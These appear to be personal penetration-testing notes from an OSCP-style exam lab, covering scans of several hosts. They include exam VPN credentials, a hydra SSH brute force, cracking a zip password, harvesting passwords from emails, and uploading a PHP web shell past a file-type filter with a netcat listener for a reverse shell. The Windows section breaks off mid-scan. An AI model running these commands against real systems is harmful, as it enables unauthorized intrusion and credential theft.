# Prep
Download the ovpn pack and extract
```sh
bzip2 --decompress exam-connection.tar.bz2 && tar -xf exam-connection.tar
```

Connect
```sh
sudo openvpn OS-######-OSCP.exam
```
Username: `OS-570362`
Password: `Ebkh3FAtZvW`

Suggested browser is Google Chrome / Chromium-based

Login OS ID: `570362`
Login Hash: `467904fe97aad23fe6564ab1a83486b1`
After connecting go to the control panel from the email. SSL error will show but continue via advanced settings

Prep Environment
```sh
sudo apt install docker.io fish -y
```

```sh
alias rustscan='sudo docker run -it --rm --name rustscan rustscan/rustscan:2.1.1 -a'
```

# Linux 1 - 192.168.140.110
Target: `192.168.140.110`
## Recon
Start with a quick open port scan
```sh
rustscan 192.168.140.110
```
	PORT   STATE SERVICE REASON
	21/tcp open  ftp     syn-ack
	22/tcp open  ssh     syn-ack
	53/tcp closed domain
	80/tcp open  http    syn-ack
![[Pasted image 20231218113312.png]]

Follow up with a service scan on those open ports
```sh
nmap -sC -sV -p21,22,80 -v -T4 192.168.140.110 -oN services.nmap
```
![[Pasted image 20231218113109.png]]
## 21/tcp open  ftp     vsftpd 3.0.5
No Info from original scan
Extended scan

```sh
sudo nmap -sC -sV -T5 -p21 -Pn -v --script=ftp-anon,ftp-bounce,ftp-libopie,ftp-proftpd-backdoor,ftp-syst,ftp-vsftpd-backdoor,ftp-vuln-cve2010-4221 192.168.140.110 -oN ftp.nmap
```

Anon Manual Check
	ftp 192.168.140.110
	Connected to 192.168.140.110.
	220 (vsFTPd 3.0.5)
	Name (192.168.140.110:kali): anonymous
	530 Permission denied.
	ftp: Login failed
	ftp> 
	ftp> exit
	221 Goodbye.

## 22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 a7:09:ae:7c:78:41:c7:a8:b4:41:17:20:f5:cd:15:75 (ECDSA)
|_  256 6c:fc:3e:2e:95:6a:54:1e:98:89:0e:c9:97:69:10:b9 (ED25519)


Database password from web `Strong.DB?Password` 
```
ssh root@192.168.140.110 
```
	Nope
Maybe: `Strong.SSH?Password`
	Nope

No service version exploit found

Trying a hydra SSH Bruteforce
```
hydra -l root -P /usr/share/wordlists/rockyou.txt ssh://192.168.140.110 -t 4 -I
```

## 80/tcp open  http    Apache httpd 2.4.52
|_http-server-header: Apache/2.4.52 (Ubuntu)
|_http-title: Index of /
| http-methods: 
|_  Supported Methods: GET POST OPTIONS HEAD

/ has nothing

dirsearch found
```
dirsearch -u http://192.168.140.110
```
	192.168.140.110/.env
		APP_NAME=Local
		APP_ENV=local
		APP_KEY=base64:yN/2x7bTc/KG/T0BZvL8s1W4N4+Y87PXRvJm8iPWzE=
		APP_DEBUG=true
		APP_URL=http://localhost
		
		DB_CONNECTION=mysql
		DB_HOST=127.0.0.1
		DB_PORT=3306
		DB_DATABASE=creds
		DB_USERNAME=root
		DB_PASSWORD=Strong.DB?Password
		
		REDIS_HOST=127.0.0.1
		REDIS_PASSWORD=null
		REDIS_PORT=6379
		nm
		MAIL_MAILER=smtp
		MAIL_HOST=smtp.mailtrap.io
		MAIL_PORT=2525
		MAIL_USERNAME=null
		MAIL_PASSWORD=null
		MAIL_ENCRYPTION=null
		MAIL_FROM_ADDRESS=null
		MAIL_FROM_NAME=""

Database name is `creds`
Database Password: `Strong.DB?Password`
App Key is base64 Encoded: `yN/2x7bTc/KG/T0BZvL8s1W4N4+Y87PXRvJm8iPWzE=`

These ports aren't open to the internet so will try on SSH

```sh
dirbuster
```
- Run at `20` threads
- Word list location:
```
/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
```
	Nothing new

```
gobuster dir -u http://192.168.140.110:80 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
```
# Linux 2 - 192.168.140.111
Target: `192.168.140.111`
## Recon
Start with a quick open port scan
```sh
rustscan 192.168.140.111
```
	PORT    STATE SERVICE      REASON
	80/tcp  open  http         syn-ack
	135/tcp open  msrpc        syn-ack
	139/tcp open  netbios-ssn  syn-ack
	443/tcp open  https        syn-ack
	445/tcp open  microsoft-ds syn-ack
	
![[Pasted image 20231218113512.png]]

Secondary Scan
```
nmap --top-ports 3000 -T5 192.168.140.110 -v
```
		3389/tcp open  ms-wbt-server
Would have missed RDP

![[Pasted image 20231219002455.png]]


Follow up with a service scan on those open ports
```sh
nmap -sC -sV -p80,135,139,443,445 -v -T4 192.168.140.111 -oN services.nmap
```
![[Pasted image 20231218113933.png]]


## 80/tcp  open  http          Microsoft IIS httpd 10.0                             
| http-methods:                                                                  
|   Supported Methods: OPTIONS TRACE GET HEAD POST                               
|_  Potentially risky methods: TRACE                                             
|_http-title: Home                                                               
|_http-server-header: Microsoft-IIS/10.0                                         
|_http-generator: Nicepage 5.13.1, nicepage.com                                  
## 135/tcp open  msrpc         Microsoft Windows RPC          

```
rpcclient -U "Guest" 192.168.140.111
```
	No Password
	Guest Connects

```
rpcclient -U "ahoward" 192.168.140.111
```
Password: Voltaic1992
Nope

## 139/tcp open  netbios-ssn   Microsoft Windows netbios-ssn                        

## 443/tcp open  ssl/http      Microsoft IIS httpd 10.0                             
|_http-server-header: Microsoft-IIS/10.0                                         
| ssl-cert: Subject: commonName=PowerShellWebAccessTestWebSite                   
| Issuer: commonName=PowerShellWebAccessTestWebSite
| Public Key type: rsa
| Public Key bits: 1024
| Signature Algorithm: sha1WithRSAEncryption
| Not valid before: 2023-08-24T08:19:45
| Not valid after:  2023-11-22T08:19:45
| MD5:   ce5f:2697:4f6f:429e:f052:4186:6f96:948c
|_SHA-1: ba7e:919b:1a3f:953c:475e:9408:75c1:8b41:9f15:8293
|_http-title: Home
|_http-generator: Nicepage 5.13.1, nicepage.com
| http-methods: 
|   Supported Methods: OPTIONS TRACE GET HEAD POST
|_  Potentially risky methods: TRACE
|_ssl-date: 2023-09-15T12:41:51+00:00; -94d03h55m12s from scanner time.
| tls-alpn: 
|_  http/1.1

Construction guys solar website at:
```
https://192.168.140.111/
```
![[Pasted image 20231218163207.png]]

Trying multiple tools for directories and files
```
dirsearch -u https://192.168.140.111
```
	
```
gobuster dir -u 192.168.140.111:443 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
```

```
dirb https://192.168.140.111
```
	
```sh
dirbuster
```
- Run at `20` threads
- Word list location:
```
/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
```

Gobuster and dirsearch found
https://192.168.140.111/aspnet_client/
/images
/launch - dirb
## 445/tcp open  SAMBA Password Extracted
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Maybe Samba

```sh
smbmap -H 192.168.140.111
```
	Nothing automated so trying manual

```
smbclient --no-pass -L //192.168.140.111
```
        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        AnneAuto        Disk      Anne's Automatic BackUps
        C$              Disk      Default share
        IPC$            IPC       Remote IPC
![[Pasted image 20231218170638.png]]

Manual Connect (Working shares)
```
smbclient //192.168.140.111/AnneAuto
```
	ls
		emails.zip
	get emails.zip
	put /tmp/test.txt
		access denied
Read access only

```
smbclient //192.168.140.111/IPC$
```
	No files in directory
	Upload not working (May be another way to upload)

Now to validate the file
```sh
file emails.zip
```
	emails.zip: Zip archive data, at least v2.0 to extract, compression method=store

```
unzip emails.zip && cd emails
```
	skipping: emails/2023_Week38/20230920093456.msg  need PK compat. v5.1 (can do v4.6)
	   creating: emails/
	   creating: emails/2023_Week38/
	   creating: emails/2023_Week39/
	   creating: emails/2023_Week40/

Now view everything
```sh
ls -altR
```
	.:
	total 20
	drwxr-xr-x 3 kali kali 4096 Nov  7 01:55 ../
	drwxr-xr-x 5 kali kali 4096 Aug 24 09:41 ./
	drwxr-xr-x 2 kali kali 4096 Jul 27 04:25 2023_Week38/
	drwxr-xr-x 2 kali kali 4096 Jul 20 08:13 2023_Week40/
	drwxr-xr-x 2 kali kali 4096 Jul 20 08:11 2023_Week39/
	./2023_Week38:
	total 8
	drwxr-xr-x 5 kali kali 4096 Aug 24 09:41 ../
	drwxr-xr-x 2 kali kali 4096 Jul 27 04:25 ./
	./2023_Week40:
	total 8
	drwxr-xr-x 5 kali kali 4096 Aug 24 09:41 ../
	drwxr-xr-x 2 kali kali 4096 Jul 20 08:13 ./
	./2023_Week39:
	total 8
	drwxr-xr-x 5 kali kali 4096 Aug 24 09:41 ../
	drwxr-xr-x 2 kali kali 4096 Jul 20 08:11 ./

```sh
tree
```
	.                                                      
	├── 2023_Week38                                        
	├── 2023_Week39                                        
	└── 2023_Week40                                        
	4 directories, 0 files

Empty. The key is resolving the unzip error

skipping: emails/2023_Week38/20230920093456.msg  need PK compat. v5.1 (can do v4.6)

Suggested to use a different zip program
https://askubuntu.com/questions/596761/error-while-unzipping-need-pk-compat-v5-1-can-do-v4-6

```
7z x emails.zip
```
	Now it prompts for a password

Time to hash and crack it
```
zip2john emails.zip > hash
```

Cut just the hash out and cracking 1 to see if it's the same for all since they are salted
```
cat hash | cut -d ":" -f 2 > hashes
```

Mod in nano. Now to crack

Multi Crack Methods
```
john hashextract --format=zip --wordlist=/usr/share/wordlists/rockyou.txt
```

```
hashcat -a 0 -m 13600 hashextract -w wordlist=/usr/share/wordlists/rockyou.txt
```

Password: `1chief`

```
7z x emails.zip
```
Shows 3 directories and 65 files
![[Pasted image 20231218232001.png]]

going through each filder
```
cat 2023_Week38/* | strings
```
	Plaintext Emails

```
cat 2023_Week39/* | strings
```
	Encrypted Emails

Password from week 38 which is a default one sent by Anne
`Voltaic1992`

User email and usernames extracted:

Anne Howard <ahoward@oscp.exam>
The boss / project manager

Rob Crossingham <rcrossingham@oscp.exam>
IT Guy
`rcrossingham`

Sasha Payne <spayne@oscp.exam>
Product Development - Asked for access to server before launch

Mica Garret <mgarret@oscp.exam>
New Girl. Bubbly. Riske with dress code

James Oliver <jolver@oscp.exam>

Dylan
HR

James Oliver <jolver@oscp.exam>
Backend projects manager

Manuel (Manny) Richmond <mrichmond@oscp.exam>
Sales

Letisha Henry <lhenry@oscp.exam>
Assistant

Username smbclient attempt
```
smbclient -U ahoward //192.168.140.111/AnneAuto
```

Trying to crack the other hashes in case there is other info in the later weeks.

All with the same password
![[Pasted image 20231219003444.png]]

All 35
![[Pasted image 20231219003524.png]]


## 3389/tcp open  RDP
|_ssl-date: 2023-09-15T20:05:38+00:00; -94d03h55m10s from scanner time.
| ssl-cert: Subject: commonName=oscp
| Issuer: commonName=oscp
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2023-08-10T09:07:03
| Not valid after:  2024-02-09T09:07:03
| MD5:   e99d8341a0af07a1a945cca6313b31ca
|_SHA-1: 6d4886da915254891009ea14962aeab38b64bf4b
| rdp-ntlm-info: 
|   Target_Name: OSCP
|   NetBIOS_Domain_Name: OSCP
|   NetBIOS_Computer_Name: OSCP
|   DNS_Domain_Name: oscp
|   DNS_Computer_Name: oscp
|   Product_Version: 10.0.17763
|_  System_Time: 2023-09-15T20:05:33+00:00

Based on the emails spayne is supposed to be able to access the server
```
xfreerdp -u spayne -p Voltaic1992 -d OSCP 192.168.140.111
```
# Linux 3 - 192.168.140.112
Target: `192.168.140.112`
## Recon
Start with a quick open port scan
```sh
rustscan 192.168.140.112
```
	PORT   STATE SERVICE REASON
	21/tcp open  ftp     syn-ack
	22/tcp open  ssh     syn-ack
	80/tcp open  http    syn-ack

![[Pasted image 20231218114044.png]]

Secondary Scan
```
nmap --top-ports 3000 -T5 192.168.140.112 -v
```
	Would have missed mySQL
	
![[Pasted image 20231219002703.png]]

Follow up with a service scan on those open ports
```sh
nmap -sC -sV -p21,22,80 -v -T4 192.168.140.112 -oN services.nmap
```
![[Pasted image 20231218114309.png]]
## 21/tcp open  ftp     vsftpd 3.0.5
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| -rw-r--r--    1 114      120         55699 Jan 03  2023 applications-dec22.zip
| -rw-r--r--    1 114      120         72600 Mar 04  2023 applications-feb23.zip
| -rw-r--r--    1 114      120         65042 Feb 02  2023 applications-jan23.zip
|_-rw-r--r--    1 114      120         49040 Dec 02  2022 applications-nov22.zip
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:192.168.49.140
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 4
|      vsFTPd 3.0.5 - secure, fast, stable
|_End of status

Downloaded them all
```
wget -r --user="anonymous" --password="anonymous" ftp://192.168.140.112/
```
Checking for write access
	ftp> put /tmp/test.txt
	local: /tmp/test.txt remote: /tmp/test.txt
	229 Entering Extended Passive Mode (|||10094|)
	550 Permission denied.
exit

Check if they are actually zips
```
file *
```
![[Pasted image 20231218132603.png]]
Nope they're just data files

Search for strings
```
cat app* | strings | sort | uniq > strings.txt
```
No passwords


## 22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 4f:d0:47:72:6f:d1:37:bf:96:74:8a:ee:d6:ab:74:49 (ECDSA)
|_  256 7b:f8:fe:ba:a3:cc:d9:15:0e:17:dc:d8:10:7b:29:b7 (ED25519)

## 80/tcp open  http    Apache httpd 2.4.52 ((Ubuntu))
|_http-title: Home
| http-methods: 
|_  Supported Methods: GET POST OPTIONS HEAD
|_http-server-header: Apache/2.4.52 (Ubuntu)
|_http-generator: Nicepage 5.4.4, nicepage.com

Seems like a portfolio generated static site. Made with nicepage

In the meta tag: ​Kalvin Piterson

```sh
dirbuster
```
- Run at `20` threads
- Word list location:
```
/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
```

Found 
http://192.168.140.112/applications/index.php

/images/
/
/icons/
/applications/
/applications/uploads/
/applications/css/
/Home.html
/About.html
/Contact.html
/jquery.js
/nicepage.js
/applications/index.php
/applications/css/1.css

![[Pasted image 20231218133512.png]]

File Up loader


## 3306/tcp open     mysql
## Weaponization

Prep nc listener
```
nc -nlvp 443
```

My VPN IP: `192.168.49.140`


Finding the best shell for the job
https://revshells.com (Pentest Monkey is usually best)

Check for php file upload restrictions
	Sorry, that format isn't allowed! Only PDF please.

Will try the other php formats and other bypasses in burp repeater 
https://book.hacktricks.xyz/pentesting-web/file-upload
Sniper intruder on single payload position for all proposed php alternatives and bypasses
![[Pasted image 20231218135618.png]]
Changed content type to: `Content-Type: application/pdf`

Uploads
![[Pasted image 20231218140221.png]]

Check
http://192.168.140.112/applications/uploads/revsh.php

No rev shell. Try other shells

PHP cmd works
![[Pasted image 20231218141124.png]]

This one loads the html code. Now to see if it sends data via tcpdump

```
tcpdump -i tun0
```

![[Pasted image 20231218141029.png]]


# Windows Entry-point & chain
## Entry - MS01 - 192.168.140.100
Target: `192.168.140.100`
## Recon
Start with a quick open port scan
```sh
rustscan 192.168.140.100
```

![[Pasted image 20231218114748.png]]

Secondary Confirmation Scan
```
nmap --top-ports 3000 -T5 192.168.140.100 -Pn -v
```
	Missed 5985
	Missed 49665
	Missed 49667


Follow up with a service scan on those open ports
```sh
sudo nmap -sC -sV -Pn -p53,88,135,139,389,445,464,593,636,3269,3268,3389,9389 -v -T5 192.168.140.100 -oN services.nmap
```
![[Pasted image 20231218115218.png]]

### 53/tcp   open  domain        Simple DNS Plus

### 88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2023-12-18 16:49:42Z)

### 135/tcp  open  msrpc         Microsoft Windows RPC

### 139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn

```sh
enum4linux -a 192.168.140.100
```

### 389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: oscp.exam0., Site: Default-First-Site-Name)

### 445/tcp  open  microsoft-ds?

### 464/tcp  open  kpasswd5?

### 593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0

### 636/tcp  open  tcpwrapped

### 3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: oscp.exam0., Site: Default-First-Site-Name)

### 3269/tcp open  tcpwrapped

### 3389/tcp open  ms-wbt-server Microsoft Terminal Services
| ssl-cert: Subject: commonName=dc01.oscp.exam
| Issuer: commonName=dc01.oscp.exam
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2023-09-19T09:42:05
| Not valid after:  2024-03-20T09:42:05
| MD5:   c6da:20f4:16a3:3226:38f6:ef0f:2ec7:6d13
|_SHA-1: 7bbc:3f91:248d:0fef:a66a:d11e:b59b:5129:fa26:58be
|_ssl-date: 2023-12-18T16:50:37+00:00; 0s from scanner time.
| rdp-ntlm-info: 
|   Target_Name: oscp
|   NetBIOS_Domain_Name: oscp
|   NetBIOS_Computer_Name: DC01
|   DNS_Domain_Name: oscp.exam
|   DNS_Computer_Name: dc01.oscp.exam
|   DNS_Tree_Name: oscp.exam
|   Product_Version: 10.0.17763
|_  System_Time: 2023-12-18T16:49:58+00:00
### 9389/tcp open  mc-nmf        .NET Message Framing

## Piviot 1 - MS02 - 192.168.140.101 
Open 192.168.140.101:135
Open 192.168.140.101:139
Open 192.168.140.101:445

Follow up with a service scan on those open ports
```sh
sudo nmap -sC -sV -Pn -p135,139,445 -v -T5 192.168.140.100 -oN services.nmap
```
## Active Directory - 192.168.140.102
Open 192.168.140.101:135
Open 192.168.140.101:139
Open 192.168.140.101:445

Follow up with a service scan on those open ports
```sh
sudo nmap -sC -sV -Pn -p135,139,445 -v -T5 192.168.140.100 -oN services.nmap
```